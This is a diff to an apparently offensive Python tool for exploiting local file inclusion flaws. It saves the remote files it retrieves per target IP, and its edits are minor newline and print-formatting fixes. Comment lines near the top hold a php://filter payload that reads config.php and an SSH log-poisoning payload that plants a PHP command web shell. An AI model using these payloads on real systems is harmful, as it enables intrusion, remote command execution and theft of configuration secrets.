@@ -14,7 +14,7 @@ from one_read import Read_File
 #php://filter/read=convert.base64-encode/resource=../../config.php
 #ssh '<?php system($_GET['cmd']); ?>'@192.168.1.136
 
-path = ('file://'+os.getcwd()+'/FileStore/')    
+path = ('file://'+os.getcwd()+'/FileStore/').replace('\\n','')    
 class Local_File_In :
     
         def __init__(self):
@@ -157,7 +157,7 @@ class Local_File_In :
                          print("[+] Full  URL           : ................ | : "+ self.url.replace('\n',''))
                          print("[+] File Name           : ................ | : "+self.args.read.replace('\\n',''),end='')
                          print("[+] save Locatoin       : ................ | : "+path+self.ip_re.group()+"/"\
-                         +self.args.read.replace('/','',1).replace('/','_'))         
+                          +self.args.read.replace('/','',1).replace('/','_'))         
                          break 
                     elif not self.args.auth and len(self.Get_Oregnal_URL) != len(first_req) :
                          print("[+] Full  URL           : ................ | : "+ self.url.replace('\n',''))
@@ -168,7 +168,7 @@ class Local_File_In :
                          print("[+] Full  URL           : ................ | : "+ self.url.replace('\n',''))
                          print("[+] File Name           : ................ | : "+self.args.read.replace('\\n',''),end='')
                          print("[+] save Locatoin       : ................ | : "+path+self.ip_re.group()+"/"\
-                         +self.args.read.replace('/','',1).replace('/','_'))                       
+                          +self.args.read.replace('/','',1).replace('/','_'),end='')                  
                          break
                    
             exit()                
@@ -202,7 +202,7 @@ class Local_File_In :
                  if i in self.url_remove :
                     join = ";".join(self.url_remove.split(i[-1]))
                     split_list = join.split(';')
-                    self.args.read= str("/".join((split_list[-3],split_list[-2],split_list[-1]))).replace('%2','/').replace('//','/')          
+                    self.args.read= str("/".join((split_list[-3],split_list[-2],split_list[-1]))).replace('%2','/').replace('//','/').replace('\\n','')          
                             
         def control(self): 
            parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -w ] [arguments]") 
